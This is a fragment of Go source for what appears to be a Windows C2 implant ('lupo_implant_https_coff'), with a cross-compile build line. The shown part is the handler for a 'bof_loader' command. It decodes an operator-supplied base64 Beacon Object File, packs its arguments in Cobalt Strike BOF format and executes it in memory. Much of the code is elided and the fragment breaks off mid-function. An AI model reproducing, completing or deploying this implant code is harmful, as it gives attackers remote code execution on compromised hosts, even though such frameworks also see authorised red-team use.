package main
// Build: CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -o lupo_implant_https_coff.exe lupo_implant_https_coff.go
	...
	if implant.id == -1 {
		...
		if unparsedCmd != "" {
			...
			if cmd != "" && len(argS) > 0 {
				...
				} else if cmd == "bof_loader" {
				// BOF binary is always the LAST argument (base64), everything else is BOF arguments
				if len(argS) < 1 {
					dataString = "Error: bof_loader requires BOF binary"
				} else {
					// Last argument is the base64-encoded BOF binary
					...
					if err != nil {
						...
						// Everything before the last argument are the BOF arguments
						var beaconData []byte
						if len(argS) > 1 {
							// Join all arguments except the last one as the BOF arguments
							bof_args_str := strings.Join(argS[0:len(argS)-1], " ")
							parsedArgs, err := shellwords.Parse(bof_args_str)
							if err == nil && len(parsedArgs) > 0 {
								// Pack arguments using GoBofRunner's BOFArgsBuffer format.
								// Supports type-prefixed syntax matching GoBofRunner: type:value
								// Types: wstring (default), string, int/integer, short
								// Most CS BOFs use WCHAR* so default to wstring.
								...
								for _, arg := range parsedArgs {
									...
									if len(parts) == 2 {
										...
										switch argType {
										case "wstring", "z":
											buffer.AddWString(argVal)
										case "string", "s":
											buffer.AddString(argVal)
										case "int", "integer", "i":
											if intVal, intErr := strconv.Atoi(argVal); intErr == nil {
												buffer.AddInt(uint32(intVal))
											} else if hexVal, hexErr := strconv.ParseUint(strings.TrimPrefix(argVal, "0x"), 16, 32); hexErr == nil {
												buffer.AddInt(uint32(hexVal))
											}
										case "short":
											if shortVal, shortErr := strconv.Atoi(argVal); shortErr == nil {
												buffer.AddShort(uint16(shortVal))
											}
										default:
											// Unknown prefix: treat the whole arg as a wstring
											buffer.AddWString(arg)
										}
									} else {
										// No type prefix: default to wide string (WCHAR*)
										// Most CS BOFs use wide strings for their arguments
										buffer.AddWString(arg)
									}
								}
								beaconData, err = buffer.GetBuffer()
								if err != nil {
							...
							// Empty arguments - create empty buffer
							buffer := &bof.BOFArgsBuffer{
								Buffer: new(bytes.Buffer),
							}
							beaconData, _ = buffer.GetBuffer()
						}
						
						// Execute BOF with panic recovery
						func() {
							defer func() {
								if r := recover(); r != nil {
